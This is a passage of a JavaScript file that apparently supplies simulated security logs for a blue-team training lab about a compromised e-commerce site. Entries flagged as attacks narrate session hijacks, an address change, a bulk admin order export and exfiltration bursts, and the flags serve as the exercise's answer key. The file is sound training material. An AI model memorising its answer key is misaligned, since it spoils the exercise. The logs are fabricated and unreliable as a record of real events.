  /* --- ATTACK: Data exfiltration --- */
  entry('14:24:25', 'fw', 'high',
    'ALLOW TCP 198.51.100.47:39100 → 203.0.113.99:443 — outbound to exfil server',
    { action: 'ALLOW', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 39100, dstIp: '203.0.113.99', dstPort: 443, rule: 'outbound-https-default', bytes: 4410000, note: 'Large outbound transfer to known exfil destination' },
    true, 'data-export');

  entry('14:24:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:24:40', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 72.44.128.90',
    null, false, null);

  entry('14:24:50', 'web', 'info',
    '203.0.113.42 GET /search?q=screen+protector — 200 OK',
    null, false, null);

  /* --- ATTACK: Second session hijack — user mweber --- */
  entry('14:25:00', 'auth', 'critical',
    'User session sess_user_c41b used from NEW IP 198.51.100.47 — was 203.0.113.42',
    { event: 'session_ip_change', user: 'mweber', sessionId: 'sess_user_c41b', previousIp: '203.0.113.42', newIp: '198.51.100.47', note: 'Second session hijack — user account' },
    true, 'session-hijack');

  /* --- ATTACK: Accessing victim account --- */
  entry('14:25:05', 'web', 'high',
    '198.51.100.47 GET /account/orders — 200 OK — python-requests/2.31.0 — accessing mweber account',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/account/orders', status: 200, bytes: 6840, userAgent: 'python-requests/2.31.0', sessionId: 'sess_user_c41b' },
    true, 'session-hijack');

  entry('14:25:10', 'web', 'info',
    '44.192.88.12 GET /search?q=mechanical+keyboard+switches — 200 OK',
    null, false, null);

  entry('14:25:20', 'web', 'info',
    '72.44.128.90 GET /products/desk-organizer — 200 OK',
    null, false, null);

  /* --- ATTACK: Third session hijack — user kpatel --- */
  entry('14:25:30', 'auth', 'critical',
    'User session sess_user_e7f3 used from NEW IP 198.51.100.47 — was 44.192.88.12',
    { event: 'session_ip_change', user: 'kpatel', sessionId: 'sess_user_e7f3', previousIp: '44.192.88.12', newIp: '198.51.100.47', note: 'Third session hijack — user account' },
    true, 'session-hijack');

  /* --- ATTACK: Shipping address change --- */
  entry('14:25:35', 'web', 'high',
    '198.51.100.47 POST /account/address — 200 OK — shipping address changed — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'POST', path: '/account/address', status: 200, bytes: 412, userAgent: 'python-requests/2.31.0', sessionId: 'sess_user_e7f3', note: 'Shipping address modified on hijacked account' },
    true, 'session-hijack');

  entry('14:25:40', 'web', 'info',
    '98.22.156.71 GET /products/desk-lamp-led — 200 OK',
    null, false, null);

  /* --- ATTACK: Browsing payment methods --- */
  entry('14:25:50', 'web', 'high',
    '198.51.100.47 GET /account/payment-methods — 200 OK — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/account/payment-methods', status: 200, bytes: 1820, userAgent: 'python-requests/2.31.0', sessionId: 'sess_user_e7f3', note: 'Attacker viewing saved payment methods' },
    true, 'data-export');

  entry('14:26:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  /* --- ATTACK: Second data exfiltration burst --- */
  entry('14:26:05', 'fw', 'high',
    'ALLOW TCP 198.51.100.47:39105 → 203.0.113.99:443 — outbound to exfil server — 1.8MB',
    { action: 'ALLOW', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 39105, dstIp: '203.0.113.99', dstPort: 443, rule: 'outbound-https-default', bytes: 1887436, note: 'Second exfiltration burst — account data' },
    true, 'data-export');

  /* --- ATTACK: Admin export of order history --- */
  entry('14:26:15', 'web', 'critical',
    '198.51.100.47 GET /admin/orders/export — 200 OK — 2.1MB — order history export',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/admin/orders/export', status: 200, bytes: 2202009, userAgent: 'python-requests/2.31.0', sessionId: 'sess_admin_7f2a', note: 'Bulk order history export including addresses and payment references' },
    true, 'data-export');

  entry('14:26:20', 'web', 'info',
    '203.0.113.42 GET /products/screen-protector-glass — 200 OK',
    null, false, null);

  /* --- ATTACK: Third exfil burst --- */
  entry('14:26:30', 'fw', 'high',
    'ALLOW TCP 198.51.100.47:39110 → 203.0.113.99:443 — outbound to exfil server — 2.2MB',
    { action: 'ALLOW', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 39110, dstIp: '203.0.113.99', dstPort: 443, rule: 'outbound-https-default', bytes: 2210000, note: 'Third exfiltration burst — order data' },
    true, 'data-export');

  entry('14:26:40', 'waf', 'medium',
    'Rate limit warning — 198.51.100.47 — 28 req/min — elevated',
    { rule: 'RATE-001', action: 'LOG_ONLY', srcIp: '198.51.100.47', reqPerMin: 28, threshold: 30 },
    true, 'recon');

  /* ════════════════════════════════════════════════════
     14:27:00 – 15:30:00  Post-attack traffic + aftermath
     ════════════════════════════════════════════════════ */

  entry('14:27:00', 'web', 'info',
    '72.44.128.90 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:27:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44400 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:27:30', 'web', 'info',
    '72.44.128.90 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:27:45', 'web', 'info',
    '72.44.128.90 GET /checkout/confirmation?order=ORD-88417 — 200 OK',
    null, false, null);

  entry('14:28:00', 'web', 'info',
    '52.78.231.108 GET /products/wireless-mouse — 200 OK',
    null, false, null);

  entry('14:28:15', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 52.78.231.108',
    null, false, null);

  entry('14:28:30', 'web', 'info',
    '44.192.88.12 GET /account/orders — 200 OK',
    null, false, null);

  entry('14:28:45', 'auth', 'info',
    'Session renewal sess_user_a91c — expired — user=jthompson',
    null, false, null);

  entry('14:29:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:29:15', 'fw', 'info',
    'ALLOW TCP 98.22.156.71:51200 → 10.0.1.50:443',
    null, false, null);

  entry('14:29:30', 'web', 'info',
    '98.22.156.71 GET /search?q=tablet+case — 200 OK',
    null, false, null);

  entry('14:29:45', 'web', 'info',
    '203.0.113.42 GET /products/power-bank-20000 — 200 OK',
    null, false, null);

  entry('14:30:00', 'web', 'info',
    '72.44.128.90 GET /products — 200 OK',
    null, false, null);

  entry('14:30:15', 'dns', 'info',
    'A query fonts.gstatic.com from 10.0.1.50',
    null, false, null);

  entry('14:30:30', 'fw', 'info',
    'DENY TCP 185.220.101.33:44100 → 10.0.1.50:445 — policy: deny-smb-external',
    null, false, null);

  entry('14:30:45', 'web', 'info',
    '52.78.231.108 GET /search?q=usb+c+adapter — 200 OK',
    null, false, null);

  entry('14:31:00', 'web', 'info',
    '44.192.88.12 POST /cart/add — 200 OK — item=MKB-006',
    null, false, null);

  entry('14:31:15', 'auth', 'info',
    'Login success user=jthompson from 98.22.156.71',
    { event: 'login_success', user: 'jthompson', srcIp: '98.22.156.71', sessionId: 'sess_user_f82d', mfa: false },
    false, null);

  entry('14:31:30', 'web', 'info',
    '98.22.156.71 GET /products/tablet-case-10in — 200 OK',
    null, false, null);

  entry('14:31:45', 'web', 'info',
    '172.217.14.99 GET /products/smart-home-hub — 200 OK — Googlebot/2.1',
    null, false, null);

  entry('14:32:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:32:15', 'waf', 'info',
    'Rate limit check — 72.44.128.90 — 8 req/min — within threshold',
    null, false, null);

  entry('14:32:30', 'web', 'info',
    '203.0.113.42 POST /cart/add — 200 OK — item=PBK-008',
    null, false, null);

  entry('14:32:45', 'fw', 'info',
    'ALLOW TCP 72.44.128.90:49500 → 10.0.1.50:443',
    null, false, null);

  entry('14:33:00', 'web', 'info',
    '72.44.128.90 GET /search?q=desk+mat — 200 OK',
    null, false, null);

  entry('14:33:15', 'dns', 'info',
    'A query updates.shopstack.lab from 10.0.1.50',
    null, false, null);

  entry('14:33:30', 'web', 'info',
    '52.78.231.108 GET /products/usb-c-adapter-hub — 200 OK',
    null, false, null);

  entry('14:33:45', 'web', 'info',
    '44.192.88.12 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:34:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44450 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:34:15', 'web', 'info',
    '44.192.88.12 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:34:30', 'web', 'info',
    '44.192.88.12 GET /checkout/confirmation?order=ORD-88418 — 200 OK',
    null, false, null);

  entry('14:34:45', 'ids', 'info',
    'Hourly summary — 4 alerts, 0 critical, traffic within norms',
    null, false, null);

  entry('14:35:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:35:15', 'web', 'info',
    '98.22.156.71 POST /cart/add — 200 OK — item=TBC-010',
    null, false, null);

  entry('14:35:30', 'auth', 'info',
    'Logout user=mweber session=sess_user_c41b',
    null, false, null);

  entry('14:35:45', 'web', 'info',
    '72.44.128.90 GET /products/desk-mat-xxl — 200 OK',
    null, false, null);

  entry('14:36:00', 'dns', 'info',
    'A query sentry.penumbraforge.com from 10.0.1.50',
    null, false, null);

  entry('14:36:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44460 → 35.186.224.25:443 — NAT outbound sentry',
    null, false, null);

  entry('14:36:30', 'web', 'info',
    '203.0.113.42 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:36:45', 'web', 'info',
    '52.78.231.108 GET /products/phone-mount-car — 200 OK',
    null, false, null);

  entry('14:37:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44470 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:37:15', 'web', 'info',
    '203.0.113.42 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:37:30', 'web', 'info',
    '203.0.113.42 GET /checkout/confirmation?order=ORD-88419 — 200 OK',
    null, false, null);

  entry('14:37:45', 'web', 'info',
    '98.22.156.71 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:38:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:38:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44480 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:38:30', 'web', 'info',
    '98.22.156.71 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:38:45', 'web', 'info',
    '98.22.156.71 GET /checkout/confirmation?order=ORD-88420 — 200 OK',
    null, false, null);

  entry('14:39:00', 'web', 'info',
    '72.44.128.90 POST /cart/add — 200 OK — item=DSM-003',
    null, false, null);

  entry('14:39:15', 'auth', 'info',
    'Session renewal sess_user_f82d for user=jthompson',
    null, false, null);

  entry('14:39:30', 'dns', 'info',
    'PTR query 99.113.0.203.in-addr.arpa from 10.0.1.50',
    null, false, null);

  entry('14:39:45', 'web', 'info',
    '44.192.88.12 GET /search?q=webcam+mount — 200 OK',
    null, false, null);

  entry('14:40:00', 'fw', 'info',
    'ALLOW TCP 52.78.231.108:59001 → 10.0.1.50:443',
    null, false, null);

  entry('14:40:15', 'web', 'info',
    '52.78.231.108 POST /cart/add — 200 OK — item=PMC-002',
    null, false, null);

  entry('14:40:30', 'web', 'info',
    '13.107.42.14 GET /products/bluetooth-speaker-xl — 200 OK — bingbot/2.0',
    null, false, null);

  entry('14:40:45', 'auth', 'info',
    'Logout user=kpatel session=sess_user_e7f3',
    null, false, null);

  entry('14:41:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:41:15', 'web', 'info',
    '72.44.128.90 GET /products/cable-management-kit — 200 OK',
    null, false, null);

  entry('14:41:30', 'web', 'info',
    '98.22.156.71 GET /account/orders — 200 OK',
    null, false, null);

  entry('14:41:45', 'dns', 'info',
    'A query api.stripe.com from 10.0.1.50',
    null, false, null);

  entry('14:42:00', 'fw', 'info',
    'ALLOW TCP 203.0.113.42:60200 → 10.0.1.50:443',
    null, false, null);

  entry('14:42:15', 'web', 'info',
    '203.0.113.42 GET /products — 200 OK',
    null, false, null);

  entry('14:42:30', 'web', 'info',
    '44.192.88.12 GET /products/webcam-mount-arm — 200 OK',
    null, false, null);

  entry('14:42:45', 'waf', 'info',
    'Rate limit check — 52.78.231.108 — 6 req/min — within threshold',
    null, false, null);

  entry('14:43:00', 'web', 'info',
    '52.78.231.108 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:43:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44510 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:43:30', 'web', 'info',
    '52.78.231.108 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:43:45', 'web', 'info',
    '52.78.231.108 GET /checkout/confirmation?order=ORD-88421 — 200 OK',
    null, false, null);

  entry('14:44:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:44:15', 'web', 'info',
    '72.44.128.90 GET /search?q=phone+charger — 200 OK',
    null, false, null);

  entry('14:44:30', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    { event: 'login_success', user: 'mweber', srcIp: '203.0.113.42', sessionId: 'sess_user_d55a', mfa: false },
    false, null);

  entry('14:44:45', 'dns', 'info',
    'AAAA query shopstack.lab.penumbraforge.com from 52.78.231.108',
    null, false, null);

  entry('14:45:00', 'web', 'info',
    '203.0.113.42 GET /account/orders — 200 OK',
    null, false, null);

  entry('14:45:15', 'fw', 'info',
    'DENY TCP 185.220.101.33:44200 → 10.0.1.50:1433 — policy: deny-mssql-external',
    null, false, null);

  entry('14:45:30', 'web', 'info',
    '98.22.156.71 GET /products/phone-charger-fast — 200 OK',
    null, false, null);

  entry('14:45:45', 'web', 'info',
    '44.192.88.12 GET /products — 200 OK',
    null, false, null);

  entry('14:46:00', 'web', 'info',
    '72.44.128.90 GET /products/phone-charger-fast — 200 OK',
    null, false, null);

  entry('14:46:15', 'ids', 'low',
    'Repeated connection attempts from 185.220.101.33 — 4 blocked ports in 45min',
    { alertId: 'CUSTOM-SCAN-002', srcIp: '185.220.101.33', dstIp: '10.0.1.50', blockedPorts: [22, 3389, 445, 1433], action: 'ALERT' },
    false, null);

  entry('14:46:30', 'web', 'info',
    '203.0.113.42 GET /products/cable-organizer — 200 OK',
    null, false, null);

  entry('14:46:45', 'dns', 'info',
    'A query status.stripe.com from 10.0.1.50',
    null, false, null);

  entry('14:47:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:47:15', 'fw', 'info',
    'ALLOW TCP 98.22.156.71:51300 → 10.0.1.50:443',
    null, false, null);

  entry('14:47:30', 'web', 'info',
    '98.22.156.71 GET /search?q=ergonomic+mouse — 200 OK',
    null, false, null);

  entry('14:47:45', 'web', 'info',
    '72.44.128.90 POST /cart/add — 200 OK — item=PCF-001',
    null, false, null);

  entry('14:48:00', 'auth', 'info',
    'Session renewal sess_user_d55a for user=mweber',
    null, false, null);

  entry('14:48:30', 'web', 'info',
    '44.192.88.12 GET /search?q=docking+station — 200 OK',
    null, false, null);

  entry('14:49:00', 'web', 'info',
    '52.78.231.108 GET /products/wireless-mouse — 200 OK',
    null, false, null);

  entry('14:49:30', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 98.22.156.71',
    null, false, null);

  entry('14:50:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:50:30', 'web', 'info',
    '98.22.156.71 GET /products/ergonomic-mouse-vertical — 200 OK',
    null, false, null);

  entry('14:51:00', 'fw', 'info',
    'ALLOW TCP 72.44.128.90:49600 → 10.0.1.50:443',
    null, false, null);

  entry('14:51:30', 'web', 'info',
    '72.44.128.90 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:52:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44550 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:52:30', 'web', 'info',
    '72.44.128.90 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:53:00', 'web', 'info',
    '72.44.128.90 GET /checkout/confirmation?order=ORD-88422 — 200 OK',
    null, false, null);

  entry('14:53:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:54:00', 'web', 'info',
    '203.0.113.42 POST /cart/add — 200 OK — item=CBO-014',
    null, false, null);

  entry('14:54:30', 'auth', 'info',
    'Logout user=admin session=sess_admin_7f2a from 10.0.0.5',
    { event: 'logout', user: 'admin', srcIp: '10.0.0.5', sessionId: 'sess_admin_7f2a' },
    false, null);

  entry('14:55:00', 'web', 'info',
    '44.192.88.12 GET /products/docking-station-usbc — 200 OK',
    null, false, null);

  entry('14:55:30', 'dns', 'info',
    'A query cdn.shopstack.lab from 104.16.55.2',
    null, false, null);

  entry('14:56:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:56:30', 'web', 'info',
    '98.22.156.71 POST /cart/add — 200 OK — item=ERM-007',
    null, false, null);

  entry('14:57:00', 'fw', 'info',
    'ALLOW TCP 52.78.231.108:59100 → 10.0.1.50:443',
    null, false, null);

  entry('14:57:30', 'web', 'info',
    '52.78.231.108 GET /search?q=keyboard+wrist+rest — 200 OK',
    null, false, null);

  entry('14:58:00', 'web', 'info',
    '203.0.113.42 GET /products/hdmi-cable-4k — 200 OK',
    null, false, null);

  entry('14:58:30', 'auth', 'info',
    'Logout user=jthompson session=sess_user_f82d',
    null, false, null);

  entry('14:59:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:59:30', 'waf', 'info',
    'Daily rule update check — ModSecurity CRS 3.3.5 — no updates available',
    null, false, null);

  entry('15:00:00', 'dns', 'info',
    'A query time.google.com from 10.0.1.50',
    null, false, null);

  entry('15:00:30', 'web', 'info',
    '72.44.128.90 GET /products/monitor-arm-dual — 200 OK',
    null, false, null);

  entry('15:01:00', 'fw', 'info',
    'ALLOW TCP 44.192.88.12:38000 → 10.0.1.50:443',
    null, false, null);

  entry('15:01:30', 'web', 'info',
    '44.192.88.12 GET /products/laptop-bag-15in — 200 OK',
    null, false, null);

  entry('15:02:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:02:30', 'web', 'info',
    '98.22.156.71 GET /search?q=webcam+ring+light — 200 OK',
    null, false, null);

  entry('15:03:00', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 44.192.88.12',
    null, false, null);

  entry('15:03:30', 'web', 'info',
    '203.0.113.42 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('15:04:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44600 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('15:04:30', 'web', 'info',
    '203.0.113.42 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('15:05:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:05:30', 'web', 'info',
    '203.0.113.42 GET /checkout/confirmation?order=ORD-88423 — 200 OK',
    null, false, null);

  entry('15:06:00', 'web', 'info',
    '72.44.128.90 GET /search?q=mousepad — 200 OK',
    null, false, null);

  entry('15:07:00', 'auth', 'info',
    'Login success user=lcheng from 72.44.128.90',
    { event: 'login_success', user: 'lcheng', srcIp: '72.44.128.90', sessionId: 'sess_user_g93b', mfa: false },
    false, null);

  entry('15:08:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:09:00', 'web', 'info',
    '72.44.128.90 GET /account/wishlist — 200 OK',
    null, false, null);

  entry('15:10:00', 'dns', 'info',
    'A query analytics.shopstack.lab from 10.0.1.50',
    null, false, null);

  entry('15:11:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:12:00', 'fw', 'info',
    'ALLOW TCP 98.22.156.71:51400 → 10.0.1.50:443',
    null, false, null);

  entry('15:13:00', 'web', 'info',
    '98.22.156.71 GET /products — 200 OK',
    null, false, null);

  entry('15:14:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:15:00', 'web', 'info',
    '44.192.88.12 GET /search?q=laptop+sleeve — 200 OK',
    null, false, null);

  entry('15:16:00', 'auth', 'info',
    'Session renewal sess_user_d55a for user=mweber',
    null, false, null);

  entry('15:17:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:18:00', 'web', 'info',
    '52.78.231.108 GET /products/keyboard-wrist-rest — 200 OK',
    null, false, null);

  entry('15:19:00', 'dns', 'info',
    'A query api.stripe.com from 10.0.1.50',
    null, false, null);

  entry('15:20:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:21:00', 'web', 'info',
    '72.44.128.90 GET /products/mousepad-xxl — 200 OK',
    null, false, null);

  entry('15:22:00', 'fw', 'info',
    'ALLOW TCP 203.0.113.42:60300 → 10.0.1.50:443',
    null, false, null);

  entry('15:23:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:24:00', 'web', 'info',
    '203.0.113.42 GET /products/laptop-stand-adjustable — 200 OK',
    null, false, null);

  entry('15:25:00', 'auth', 'info',
    'Logout user=mweber session=sess_user_d55a',
    null, false, null);

  entry('15:26:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:27:00', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 13.107.42.14',
    null, false, null);

  entry('15:28:00', 'web', 'info',
    '13.107.42.14 GET /products/noise-cancel-headphones — 200 OK — bingbot/2.0',
    null, false, null);

  entry('15:29:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:29:30', 'auth', 'info',
    'Logout user=lcheng session=sess_user_g93b',
    null, false, null);

  entry('15:30:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  /* ════════════════════════════════════════════════════
     Scenario registry
     ════════════════════════════════════════════════════ */

  var scenarios = {
    'blue-investigate-shopstack': SHOPSTACK
  };

  /* ════════════════════════════════════════════════════
     Public API
     ════════════════════════════════════════════════════ */

  var EvidenceCorpus = {
    /**
     * Return log entries for a given scenario.
     * @param {string} scenarioId
     * @returns {Array} array of log entry objects (chronological)
     */
    get: function (scenarioId) {
      return scenarios[scenarioId] || [];
    }
  };

  /* ── Register on global namespace ───────────────── */
  window.PenumbraLabs = window.PenumbraLabs || {};
  window.PenumbraLabs.EvidenceCorpus = EvidenceCorpus;

})();
